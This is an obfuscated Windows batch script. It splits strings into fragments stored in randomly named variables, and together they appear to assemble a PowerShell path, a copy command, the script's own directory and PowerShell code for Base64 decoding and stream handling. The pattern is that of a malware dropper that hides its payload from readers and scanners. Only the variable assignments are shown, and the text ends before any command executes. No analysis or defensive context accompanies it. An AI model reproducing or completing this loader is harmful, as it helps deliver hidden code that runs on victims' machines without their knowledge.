@echo off
set "muyORHmlfd=ll"
set "lRHuuiDuyr=:\"
set "KPoheiHxnh=we"
set "thrybiKKhy= C"
set "RjoayFizgx=nd"
set "SfQgHcDHWP=Sy"
set "wYngCLASNH=we"
set "wBskmItfLJ=ws"
set "bVSDuCWtbz=\v"
set "KQdyGKIMlL=po"
set "FBqFnsspFP=he"
set "kEAsdgVCSc=\W"
set "aeoaUnfzKx=st"
set "nAUFbjyJUL=1."
set "BMxipSdLWk=ll"
set "QEVdOwxvZr=he"
set "xHKNCOlwhe=ow"
set "pkhpFXcjCH=rS"
set "UPnnlyqFTb=Wi"
set "ljDMpDUemD=s\"
set "FTRBmPEbdk=py"
set "nTyPQHGBKU=em"
set "iDrunJduIz=rs"
set "yvtPqYHbpZ=in"
set "QrRyVULsyY=0\"
set "GoeLURcksf=xe"
set "KdmDFrQEgA=32"
set "FsxxfXaeoH=y "
set "wbXceWRLvC=do"
set "uTEQPhyJlW=.e"
set "neTwgwfieu= /"
set "NzYiFhrSmO=co"
set "MdJHwpKxnG=Po"
set "XHJwujvQDH=cd"
set "vYmEojgRZY= %~dp0"
set "BIBAIWMRFM=).Sp"
set "uTkClKiIpA=dy ="
set "KYqRmHBRre='gni"
set "KpaFDNVdza=urit"
set "tXJdHMrqsp=qheC"
set "NBfrGciUDK=ddin"
set "hEWBUNMGCl=::('"
set "fmkYeOXbeT=iron"
set "JrmDFvkGqk=and "
set "QJWGNeyvjC=;$pQ"
set "dWMkZaIhNF=dy.T"
set "noouZUVOIe=$qhe"
set "QAtGfvFyZz=uTnB"
set "cxOVNQAjED=pose"
set "PKYTbMGZfb=YU.T"
set "KDuyFpbXcA=tS46"
set "iJNwhNqDtS= = $"
set "KFfuPBoBIY=New-"
set "XVzbTKVAVG=am;$"
